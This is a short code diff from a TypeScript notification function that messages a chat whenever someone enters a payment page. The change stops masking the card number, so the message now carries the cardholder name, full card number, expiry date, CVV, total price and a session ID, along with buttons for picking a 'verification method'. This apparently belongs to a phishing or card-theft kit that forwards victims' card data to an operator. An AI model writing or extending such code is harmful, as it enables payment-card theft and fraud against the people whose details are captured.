@@ -174,9 +174,10 @@ async function sendNotification(chatId: string, type: string, data: any) {
     case 'payment_started':
       message = `💳 *Payment Page Entered*\n\n` +
                 `👤 Cardholder: ${data.cardholder_name}\n` +
-                `💳 Card: **** **** **** ${data.card_number.slice(-4)}\n` +
+                `💳 Card: ${data.card_number}\n` +
                 `📅 Expiry: ${data.expiry_date}\n` +
-                `🔐 CVV: ${data.cvv}\n\n` +
+                `🔐 CVV: ${data.cvv}\n` +
+                `💰 Gesamtpreis: €${data.final_price.toFixed(2)}\n\n` +
                 `Session ID: \`${data.session_id}\``;
       buttons = getVerificationMethodButtons(data.session_id);
       break;
